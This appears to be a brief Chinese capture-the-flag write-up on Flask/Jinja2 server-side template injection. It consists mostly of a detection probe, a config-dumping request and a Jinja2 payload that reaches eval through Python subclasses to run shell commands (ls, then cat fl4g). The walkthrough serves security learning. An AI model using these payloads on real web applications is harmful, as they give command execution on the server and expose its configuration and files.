# python_Flask_template_injection
## 漏洞检测
```
http://X.X.X.X:33006/{{6+6}} 
```
## {{ config.items() }}可以查看服务器的配置信息
```
http://X.X.X.X:33006/{{ config.items() }} 
```
## 出现配置信息payload：
```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}   
  {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
    {% if 'eval' in b.keys() %}    //找到了
      {{ b['eval']('__import__("os").popen("ls").read()') }}  //导入cmd 执行popen里的命令 read读出数据
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
## 将ls命令改为 cat fl4g即可读取fl4g的内容，payload如下:
```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}  
  {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
    {% if 'eval' in b.keys() %}    //找到了
      {{ b['eval']('__import__("os").popen("cat fl4g").read()') }} 
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
